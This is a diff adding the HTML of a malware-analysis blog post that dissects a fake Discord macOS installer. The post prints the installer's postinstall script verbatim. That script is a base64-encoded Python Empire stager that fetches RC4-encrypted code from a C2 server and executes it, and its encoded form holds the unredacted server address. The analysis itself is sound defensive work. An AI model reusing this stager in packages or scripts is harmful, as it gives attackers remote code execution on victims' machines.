@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+
+    <title>Where DFIR Meets IT - ForensicITGuy's blog about DFIR and tech</title>
+    <meta name="description" content="ForensicITGuy's blog about DFIR and tech" />
+
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="MobileOptimized" content="320" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <link rel="stylesheet" type="text/css" href="/assets/css/screen.css" />
+    <link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=Merriweather:300,700,700italic,300italic|Open+Sans:700,400" />
+    <!-- Customisation  -->
+    <link rel="stylesheet" type="text/css" href="/assets/css/main.css " />
+
+</head>
+<body class="home-template">
+
+    <header class="main-header post-head no-cover">
+    <nav class="main-nav  clearfix">
+        <a class="back-button icon-arrow-left" href="/">Home</a>
+        <a class="subscribe-button icon-feed" href="/feed.xml">Subscribe</a>
+    </nav>
+</header>
+
+<main class="content" role="main">
+
+    <article class="post">
+
+        <header class="post-header">
+            <h1 class="post-title">Analyzing an Empire macOS PKG Stager</h1>
+            <section class="post-meta">
+                
+                    on macOS, Empire, PKG, and malware
+                
+                <time class="post-date" datetime="2021-02-08">08 Feb 2021</time>
+            </section>
+        </header>
+
+<!--         <header class="post-header">
+            <a id="blog-logo" href="https://forensicitguy.github.io/feed.xml">
+                
+                    <span class="blog-title">Where DFIR Meets IT</span>
+                
+            </a>
+        </header> -->
+
+        <!-- <span class="post-meta">
+            <time datetime="2021-02-08">08 Feb 2021</time>
+            
+                on macOS, Empire, PKG, and malware
+            
+        </span> -->
+
+        <!-- <h1 class="post-title">Analyzing an Empire macOS PKG Stager</h1> -->
+
+        <section class="post-content">
+            <p>Command and control (C2) frameworks often support multiple platforms, and PowerShell Empire is no different. In older days, there was a Python Empyre version that eventually merged into the full Empire project and support for macOS and Linux systems still exists within Empire. For these platforms, Empire leverages python-based launchers to execute commands. While the Python launchers may be platform independent, adversaries must still deliver them to victim hosts. This delivery presents an excellent opportunity for detection and analysis. For this example, we’re going to walk through the analysis of an Empire stager found in VirusTotal: <a href="https://www.virustotal.com/gui/file/19e19adc03b313236462b30a1a438a604d4c0b4c86268b951689696144a63fdc/detection">https://www.virustotal.com/gui/file/19e19adc03b313236462b30a1a438a604d4c0b4c86268b951689696144a63fdc/detection</a>.</p>
+
+<h2 id="inspecting-the-pkg-file">Inspecting The PKG File</h2>
+
+<p>For this analysis, we’ll work from a REMnux v7 host. To start off, let’s make sure we have a working folder for files.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">mkdir</span> <span class="nt">-p</span> ~/cases/empire-stager/stager
+<span class="nv">$ </span><span class="nb">mv</span> ~/Downloads/discord.pkg empire-stager/
+<span class="nv">$ </span><span class="nb">cd </span>empire-stager/
+<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-lah</span>
+
+total 48K
+drwxrwxr-x 3 remnux remnux 4.0K Feb  8 23:38 <span class="nb">.</span>
+drwxrwxr-x 9 remnux remnux 4.0K Feb  8 23:37 ..
+<span class="nt">-rw-rw-r--</span> 1 remnux remnux  35K Feb  7 01:30 discord.pkg
+drwxrwxr-x 2 remnux remnux 4.0K Feb  8 23:37 stager
+</code></pre></div></div>
+
+<p>The PKG file masquerades as a component related to the Discord application, possibly the installer. To proceed we can go ahead and get an idea of the file type using the <code class="language-plaintext highlighter-rouge">file</code> command.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>file discord.pkg
+
+discord.pkg: xar archive compressed TOC: 2674, SHA-1 checksum
+</code></pre></div></div>
+
+<p>The output indicates the PKG file is a XAR archive, exactly what we expect for a PKG file.</p>
+
+<p>Moving forward, we can unpack the PKG using <code class="language-plaintext highlighter-rouge">bsdtar</code>.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>bsdtar xvf discord.pkg <span class="nt">-C</span> stager/
+
+x Resources
+x Resources/ru-RU.lproj
+x Distribution
+x update.pkg
+x update.pkg/PackageInfo
+x update.pkg/Bom
+x update.pkg/Payload
+x update.pkg/Scripts
+
+<span class="nv">$ </span><span class="nb">cd </span>stager/
+<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-lah</span>
+
+total 20K
+drwxrwxr-x 4 remnux remnux 4.0K Feb  8 23:44 <span class="nb">.</span>
+drwxrwxr-x 3 remnux remnux 4.0K Feb  8 23:38 ..
+<span class="nt">-rw-r--r--</span> 1 remnux remnux 1.8K Nov 27  2019 Distribution
+drwxr-xr-x 3 remnux remnux 4.0K Nov 27  2019 Resources
+drwxr-xr-x 2 remnux remnux 4.0K Nov 27  2019 update.pkg
+</code></pre></div></div>
+
+<p>Within the Resources folder there is a <code class="language-plaintext highlighter-rouge">ru-RU.lproj</code> file. From the naming convention we can hypothesize it has something to do with language resources, but we can’t be sure because the folder is empty upon inspection.</p>
+
+<p>Next, we can inspect the contents of the <code class="language-plaintext highlighter-rouge">update.pkg</code> folder. As seen in the output of <code class="language-plaintext highlighter-rouge">bsdtar</code>, it contains just a few files:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-lah</span>
+
+total 84K
+drwxr-xr-x 2 remnux remnux 4.0K Nov 27  2019 <span class="nb">.</span>
+drwxrwxr-x 4 remnux remnux 4.0K Feb  8 23:44 ..
+<span class="nt">-rw-r--r--</span> 1 remnux remnux  35K Nov 27  2019 Bom
+<span class="nt">-rw-r--r--</span> 1 remnux remnux  777 Nov 27  2019 PackageInfo
+<span class="nt">-rw-r--r--</span> 1 remnux remnux  29K Nov 27  2019 Payload
+<span class="nt">-rw-r--r--</span> 1 remnux remnux  917 Nov 27  2019 Scripts
+
+<span class="nv">$ </span>file <span class="k">*</span>
+
+Bom:         Mac OS X bill of materials <span class="o">(</span>BOM<span class="o">)</span> file
+PackageInfo: ASCII text
+Payload:     <span class="nb">gzip </span>compressed data, from Unix, original size modulo 2^32 77824
+Scripts:     <span class="nb">gzip </span>compressed data, from Unix, original size modulo 2^32 1536
+</code></pre></div></div>
+
+<p>From the directory structure and file types, it seems the contents match what we would expect from a macOS PKG file. There is a Bill of Materials (BOM) file, PackageInfo in text/XML format, and two gzipped CPIO archives: Payload and Scripts. Before unpacking the Payload and Scripts, we can inspect the PackageInfo file with <code class="language-plaintext highlighter-rouge">less</code>.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>less PackageInfo
+
+&lt;pkg-info format-version<span class="o">=</span><span class="s2">"2"</span> <span class="nv">identifier</span><span class="o">=</span><span class="s2">"com.apple.Discord"</span> <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> install-location<span class="o">=</span><span class="s2">"/"</span> <span class="nv">auth</span><span class="o">=</span><span class="s2">"root"</span> overwrite-permissions<span class="o">=</span><span class="s2">"true"</span> generator-version<span class="o">=</span><span class="s2">"InstallCmds-554 (15G31)"</span><span class="o">&gt;</span>
+    &lt;payload <span class="nv">numberOfFiles</span><span class="o">=</span><span class="s2">"15"</span> <span class="nv">installKBytes</span><span class="o">=</span><span class="s2">"105"</span>/&gt;
+    &lt;scripts&gt;
+        &lt;postinstall <span class="nv">file</span><span class="o">=</span><span class="s2">"./postinstall"</span>/&gt;
+    &lt;/scripts&gt;
+    &lt;bundle <span class="nb">id</span><span class="o">=</span><span class="s2">"com.apple.Discord"</span> <span class="nv">CFBundleIdentifier</span><span class="o">=</span><span class="s2">"com.apple.Discord"</span> <span class="nv">path</span><span class="o">=</span><span class="s2">"./Discord.app"</span> <span class="nv">CFBundleShortVersionString</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">CFBundleVersion</span><span class="o">=</span><span class="s2">"1"</span>/&gt;
+    &lt;bundle-version&gt;
+        &lt;bundle <span class="nb">id</span><span class="o">=</span><span class="s2">"com.apple.Discord"</span>/&gt;
+    &lt;/bundle-version&gt;
+    &lt;upgrade-bundle&gt;
+        &lt;bundle <span class="nb">id</span><span class="o">=</span><span class="s2">"com.apple.Discord"</span>/&gt;
+    &lt;/upgrade-bundle&gt;
+    &lt;update-bundle/&gt;
+    &lt;atomic-update-bundle/&gt;
+    &lt;strict-identifier&gt;
+        &lt;bundle <span class="nb">id</span><span class="o">=</span><span class="s2">"com.apple.Discord"</span>/&gt;
+    &lt;/strict-identifier&gt;
+&lt;/pkg-info&gt;
+</code></pre></div></div>
+
+<p>There are a few things to note from this file. First, the PackageInfo file doubles down on the masquerade that the PKG file is related to Discord. Next, the <code class="language-plaintext highlighter-rouge">installKBytes</code> field contains a value <code class="language-plaintext highlighter-rouge">105</code>. This gives us reasonable evidence to assume the Payloads archive will contain some form of content. In payload-free package files, the <code class="language-plaintext highlighter-rouge">installKBytes</code> field will contain the value <code class="language-plaintext highlighter-rouge">0</code>, indicating all the work is done by preinstall and postinstall scripts.</p>
+
+<p>Finally, the <code class="language-plaintext highlighter-rouge">scripts</code> section of the PackageInfo file indicates we can expect Scripts to unpack a postintall script for execution. This postinstall script should execute after the macOS Installer utility processes the content of the PKG file and after the “installation” is complete. In legitimate use cases, applications would take this opportunity to use postinstall scripts to clean up unneeded files. In this case, the postinstall script executes malware.</p>
+
+<h2 id="unpacking-the-malicious-content">Unpacking the Malicious Content</h2>
+
+<p>Now we can unpack the Payload and Scripts archives.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>Payload | <span class="nb">gunzip</span> | cpio <span class="nt">-i</span>
+152 blocks
+<span class="nv">$ </span><span class="nb">cat </span>Scripts | <span class="nb">gunzip</span> | cpio <span class="nt">-i</span>
+3 blocks
+
+<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-lah</span>
+total 92K
+drwxr-xr-x 3 remnux remnux 4.0K Feb  9 00:01 <span class="nb">.</span>
+drwxrwxr-x 4 remnux remnux 4.0K Feb  8 23:44 ..
+drwxr-xr-x 3 remnux remnux 4.0K Feb  9 00:01 Applications
+<span class="nt">-rw-r--r--</span> 1 remnux remnux  35K Nov 27  2019 Bom
+<span class="nt">-rw-r--r--</span> 1 remnux remnux  777 Nov 27  2019 PackageInfo
+<span class="nt">-rw-r--r--</span> 1 remnux remnux  29K Nov 27  2019 Payload
+<span class="nt">-rwxr-xr-x</span> 1 remnux remnux 1.1K Feb  9 00:01 postinstall
+<span class="nt">-rw-r--r--</span> 1 remnux remnux  917 Nov 27  2019 Scripts
+
+<span class="nv">$ </span>file postinstall 
+postinstall: Bourne-Again shell script, ASCII text executable, with very long lines
+</code></pre></div></div>
+
+<p>Now the postinstall script is unpacked, we can recognize its file type as a Bash script. This is important to note as a postinstall script can be written in any scripting language for which the system contains an interpreter. In some packages, I’ve also seen postinstall to be a Mach-O binary instead of a script. To see the contents of postinstall, we can use the <code class="language-plaintext highlighter-rouge">less</code> command again.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>less postinstall
+
+<span class="c">#!/bin/bash</span>
+
+<span class="nb">echo</span> <span class="s2">"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xNzYuMTI2LjcwLjEzMjoxMDAwMSc7dD0nL2xvZ2luL3Byb2Nlc3MucGhwJztyZXE9dXJsbGliMi5SZXF1ZXN0KHNlcnZlcit0KTsKcmVxLmFkZF9oZWFkZXIoJ1VzZXItQWdlbnQnLFVBKTsKcmVxLmFkZF9oZWFkZXIoJ0Nvb2tpZScsInNlc3Npb249cUc5WlFZWFdlMEk1cG15dFpFMU4wdkFxbTljPSIpOwpwcm94eSA9IHVybGxpYjIuUHJveHlIYW5kbGVyKCk7Cm8gPSB1cmxsaWIyLmJ1aWxkX29wZW5lcihwcm94eSk7CnVybGxpYjIuaW5zdGFsbF9vcGVuZXIobyk7CmE9dXJsbGliMi51cmxvcGVuKHJlcSkucmVhZCgpOwpJVj1hWzA6NF07ZGF0YT1hWzQ6XTtrZXk9SVYrJzBlZjk2NzMyNzg5NzE4NTI1ZTc2MzgyOTM3MGJkNDg4JztTLGosb3V0PXJhbmdlKDI1NiksMCxbXQpmb3IgaSBpbiByYW5nZSgyNTYpOgogICAgaj0oaitTW2ldK29yZChrZXlbaSVsZW4oa2V5KV0pKSUyNTYKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV0KaT1qPTAKZm9yIGNoYXIgaW4gZGF0YToKICAgIGk9KGkrMSklMjU2CiAgICBqPShqK1NbaV0pJTI1NgogICAgU1tpXSxTW2pdPVNbal0sU1tpXQogICAgb3V0LmFwcGVuZChjaHIob3JkKGNoYXIpXlNbKFNbaV0rU1tqXSklMjU2XSkpCmV4ZWMoJycuam9pbihvdXQpKQ=='));"</span> | /usr/bin/python &amp;
+
+<span class="nb">exit </span>0
+</code></pre></div></div>
+
+<p>The postinstall script contains base64-encoded Python commands. We know they’re base64-encoded because they’ll be decoded at runtime using the functions <code class="language-plaintext highlighter-rouge">base64.b64decode</code> and executed with <code class="language-plaintext highlighter-rouge">exec</code>. In addition, the stager uses an <code class="language-plaintext highlighter-rouge">echo</code> command to pass the code into a <code class="language-plaintext highlighter-rouge">python</code> process. This is an evasion method, ensuring that process monitoring software such as EDR won’t notice Python having suspicious command line parameters. Since the code is in base64, we can easily decode it with the command <code class="language-plaintext highlighter-rouge">base64 -d</code> and write it to a plaintext file.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"aW1wb3J0IHN5cztpbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xNzYuMTI2LjcwLjEzMjoxMDAwMSc7dD0nL2xvZ2luL3Byb2Nlc3MucGhwJztyZXE9dXJsbGliMi5SZXF1ZXN0KHNlcnZlcit0KTsKcmVxLmFkZF9oZWFkZXIoJ1VzZXItQWdlbnQnLFVBKTsKcmVxLmFkZF9oZWFkZXIoJ0Nvb2tpZScsInNlc3Npb249cUc5WlFZWFdlMEk1cG15dFpFMU4wdkFxbTljPSIpOwpwcm94eSA9IHVybGxpYjIuUHJveHlIYW5kbGVyKCk7Cm8gPSB1cmxsaWIyLmJ1aWxkX29wZW5lcihwcm94eSk7CnVybGxpYjIuaW5zdGFsbF9vcGVuZXIobyk7CmE9dXJsbGliMi51cmxvcGVuKHJlcSkucmVhZCgpOwpJVj1hWzA6NF07ZGF0YT1hWzQ6XTtrZXk9SVYrJzBlZjk2NzMyNzg5NzE4NTI1ZTc2MzgyOTM3MGJkNDg4JztTLGosb3V0PXJhbmdlKDI1NiksMCxbXQpmb3IgaSBpbiByYW5nZSgyNTYpOgogICAgaj0oaitTW2ldK29yZChrZXlbaSVsZW4oa2V5KV0pKSUyNTYKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV0KaT1qPTAKZm9yIGNoYXIgaW4gZGF0YToKICAgIGk9KGkrMSklMjU2CiAgICBqPShqK1NbaV0pJTI1NgogICAgU1tpXSxTW2pdPVNbal0sU1tpXQogICAgb3V0LmFwcGVuZChjaHIob3JkKGNoYXIpXlNbKFNbaV0rU1tqXSklMjU2XSkpCmV4ZWMoJycuam9pbihvdXQpKQ=="</span> | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span> python-stager.txt
+</code></pre></div></div>
+
+<h2 id="analyzing-the-python-code">Analyzing The Python Code</h2>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>less python-stager.txt
+
+import sys<span class="p">;</span>import urllib2<span class="p">;</span>
+<span class="nv">UA</span><span class="o">=</span><span class="s1">'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'</span><span class="p">;</span><span class="nv">server</span><span class="o">=</span><span class="s1">'hxxp://176.126.70[.]xxx:10001'</span><span class="p">;</span><span class="nv">t</span><span class="o">=</span><span class="s1">'/login/process.php'</span><span class="p">;</span><span class="nv">req</span><span class="o">=</span>urllib2.Request<span class="o">(</span>server+t<span class="o">)</span><span class="p">;</span>
+req.add_header<span class="o">(</span><span class="s1">'User-Agent'</span>,UA<span class="o">)</span><span class="p">;</span>
+req.add_header<span class="o">(</span><span class="s1">'Cookie'</span>,<span class="s2">"session=qG9ZQYXWe0I5pmytZE1N0vAqm9c="</span><span class="o">)</span><span class="p">;</span>
+proxy <span class="o">=</span> urllib2.ProxyHandler<span class="o">()</span><span class="p">;</span>
+o <span class="o">=</span> urllib2.build_opener<span class="o">(</span>proxy<span class="o">)</span><span class="p">;</span>
+urllib2.install_opener<span class="o">(</span>o<span class="o">)</span><span class="p">;</span>
+<span class="nv">a</span><span class="o">=</span>urllib2.urlopen<span class="o">(</span>req<span class="o">)</span>.read<span class="o">()</span><span class="p">;</span>
+<span class="nv">IV</span><span class="o">=</span>a[0:4]<span class="p">;</span><span class="nv">data</span><span class="o">=</span>a[4:]<span class="p">;</span><span class="nv">key</span><span class="o">=</span>IV+<span class="s1">'0ef96732789718525e763829370bd488'</span><span class="p">;</span>S,j,out<span class="o">=</span>range<span class="o">(</span>256<span class="o">)</span>,0,[]
+<span class="k">for </span>i <span class="k">in </span>range<span class="o">(</span>256<span class="o">)</span>:
+    <span class="nv">j</span><span class="o">=(</span>j+S[i]+ord<span class="o">(</span>key[i%len<span class="o">(</span>key<span class="o">)]))</span>%256
+    S[i],S[j]<span class="o">=</span>S[j],S[i]
+<span class="nv">i</span><span class="o">=</span><span class="nv">j</span><span class="o">=</span>0
+<span class="k">for </span>char <span class="k">in </span>data:
+    <span class="nv">i</span><span class="o">=(</span>i+1<span class="o">)</span>%256
+    <span class="nv">j</span><span class="o">=(</span>j+S[i]<span class="o">)</span>%256
+    S[i],S[j]<span class="o">=</span>S[j],S[i]
+    out.append<span class="o">(</span>chr<span class="o">(</span>ord<span class="o">(</span>char<span class="o">)</span>^S[<span class="o">(</span>S[i]+S[j]<span class="o">)</span>%256]<span class="o">))</span>
+<span class="nb">exec</span><span class="o">(</span><span class="s1">''</span>.join<span class="o">(</span>out<span class="o">))</span>
+</code></pre></div></div>
+
+<p>While inspecting the Python code, we can note a few things for leads. First, the C2 server for this implant is at 176.126.70.xxx (intentionally redacted) on port 10001 listening for the HTTP protocol. When visiting the C2 server for commands, the code will request a URI path of <code class="language-plaintext highlighter-rouge">/login/process.php</code> using a user-agent string of <code class="language-plaintext highlighter-rouge">Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko</code>. Both of these details help Empire’s network traffic masquerade as legitimate traffic in an enterprise network.</p>
+
+<p>With this cleartext code, we can easily attribute the code to Empire with code publicly available on GitHub. In this case, the Python code comes from this file in the former, archived Empire repository: <a href="https://github.com/EmpireProject/Empire/blob/master/lib/listeners/http.py#L413">https://github.com/EmpireProject/Empire/blob/master/lib/listeners/http.py#L413</a>.</p>
+
+<p>The PKG stager packaging is also in the repository here: <a href="https://github.com/EmpireProject/Empire/blob/master/lib/common/stagers.py#L404">https://github.com/EmpireProject/Empire/blob/master/lib/common/stagers.py#L404</a>.</p>
+
+<h2 id="does-the-app-even-do-anything">Does The App Even Do Anything?</h2>
+
+<p>From here we’re certain the PKG file contains an Empire stager, but it could also potentially contain legitimate functionality related to Discord. We can rule that out by investigating the rest of the PKG contents.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cd </span>Applications/Discord.app/
+<span class="nv">$ </span>tree <span class="nt">-a</span>
+<span class="nb">.</span>
+└── Contents
+    ├── _CodeSignature
+    │   └── CodeResources
+    ├── Info.plist
+    ├── MacOS
+    │   └── Discord
+    ├── PkgInfo
+    └── Resources
+        ├── Base.lproj
+        │   └── MainMenu.nib
+        └── Scatter.icns
+
+5 directories, 6 files
+</code></pre></div></div>
+
+<p>Using the <code class="language-plaintext highlighter-rouge">tree</code> command, we can inspect the folder structure without all the laborious <code class="language-plaintext highlighter-rouge">ls</code> commands. Within macOS application bundles, the main executable of interest typically lives in the Contents/MacOS folder. In this case, it’s named Discord.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cd </span>Contents/MacOS/
+<span class="nv">$ </span>file Discord 
+Discord: Mach-O 64-bit x86_64 executable, flags:&lt;NOUNDEFS|DYLDLINK|TWOLEVEL|PIE&gt;
+</code></pre></div></div>
+
+<p>From the output of <code class="language-plaintext highlighter-rouge">file</code> we know that Discord is definitely a Mach-O executable binary. We’re not going to fully reverse the binary, but we can get some additional evidence by simply running <code class="language-plaintext highlighter-rouge">strings</code> to see if we can identify suspicious binary contents. First, we’ll run <code class="language-plaintext highlighter-rouge">strings</code> to get standard ASCII characters into a file. Then, we’ll re-run <code class="language-plaintext highlighter-rouge">strings</code> again, targeting the Unicode characters.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>strings Discord <span class="o">&gt;</span> discord.strings.txt
+<span class="nv">$ </span>strings <span class="nt">-el</span> Discord <span class="o">&gt;&gt;</span> discord.strings.txt 
+
+<span class="nv">$ </span>less discord.strings.txt
+
+__PAGEZERO
+__TEXT
+__text
+__TEXT
+__const
+__TEXT
+__unwind_info
+__TEXT
+__DATA
+__objc_imageinfo__DATA
+__LINKEDIT
+/usr/lib/dyld
+/System/Library/Frameworks/Python.framework/Versions/2.7/Python
+/System/Library/Frameworks/Foundation.framework/Versions/C/Foundation
+/usr/lib/libobjc.A.dylib
+/usr/lib/libSystem.B.dylib
+@<span class="o">(</span><span class="c">#)PROGRAM:templateMachoExe  PROJECT:templateMachoExe-</span>
+_mh_execute_header
+:main
+<span class="o">&gt;</span>templateMachoExeVersion
+String
+UNumber
+__mh_execute_header
+_main
+_templateMachoExeVersionNumber
+_templateMachoExeVersionString
+dyld_stub_binder
+templateMachoExe-555549440018c666ecdc32b59bfb39f5a574c24d
+PC^t
+templateMachoExe-555549440018c666ecdc32b59bfb39f5a574c24d
+@DxG
+</code></pre></div></div>
+
+<p>It’s not common to see a functional binary quite this lean in strings. In fact, there doesn’t appear to be anything in the binary specifically relevant to Discord in any way. An additional lead to investigate is the string <code class="language-plaintext highlighter-rouge">templateMachoExe</code> present in the <code class="language-plaintext highlighter-rouge">strings</code> output. This string could indicate the binary is a generic copy of the template Mach-O file contained with Empire. To find out for sure, you can download the <a href="https://github.com/EmpireProject/Empire/blob/master/data/misc/machotemplate">template file</a> and run <code class="language-plaintext highlighter-rouge">strings</code> against it to compare the output.</p>
+
+<p>Hopefully this helps illustrate how Empire stagers work on macOS, thanks for reading!</p>
+
+
+        </section>
+
+        
+
+        <footer class="post-footer">
+            <!-- If we want to display author's name and bio -->
+            
+                <figure class="author-image">
+                    <a class="img" href="/" style="background-image: url(/assets/images/profile.png)">
+                    <span class="hidden">Tony Lambert (ForensicITGuy)'s Picture</span></a>
+                </figure>
+                <section class="author">
+                    <!-- Author Name -->
+                    <h4> Tony Lambert (ForensicITGuy) </h4>
+                    <!-- Author Bio -->
+                    <p>
+                        An educator that happens to do security things for Red Canary
+                    </p>
+                </section>
+            
+
+            <!-- Share links section -->
+            <section class="share">
+    <h4>Share this post</h4>
+    <a class="icon-twitter" href="http://twitter.com/share?text=Analyzing an Empire macOS PKG Stager&amp;url=https://forensicitguy.github.io/analyzing-empire-macos-pkg-stager/"
+        onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <span class="hidden">Twitter</span>
+    </a>
+    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https://forensicitguy.github.io/analyzing-empire-macos-pkg-stager/"
+        onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <span class="hidden">Facebook</span>
+    </a>
+    <a class="icon-google-plus" href="https://plus.google.com/share?url=https://forensicitguy.github.io/analyzing-empire-macos-pkg-stager/"
+       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+        <span class="hidden">Google+</span>
+    </a>
+</section>
+
+            <!-- Disqus comments -->
+            
+
+        </footer>
+
+    </article>
+
+</main>
+
+    <footer class="site-footer clearfix">
+      <section class="copyright">
+        <a href="">Where DFIR Meets IT</a> &copy; 
+              2021 &bull; All rights reserved.
+      </section>
+      <section class="poweredby">Made with Jekyll using 
+        <a href="http://github.com/rosario/kasper">Kasper theme</a>
+      </section>
+    </footer>
+    
+    <script type="text/javascript" src="/assets/js/jquery-1.11.1.min.js"></script>
+    <script type="text/javascript" src="/assets/js/jquery.fitvids.js"></script>
+    <script type="text/javascript" src="/assets/js/index.js"></script>
+
+    <!-- Google Analytics Tracking code -->
+    <script type="text/javascript">
+
+      var _gaq = _gaq || [];
+      _gaq.push(['_setAccount', 'UA-155060013-1']);
+      _gaq.push(['_trackPageview']);
+
+      (function() {
+        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+      })();
+
+    </script>   
+</body>
+</html>
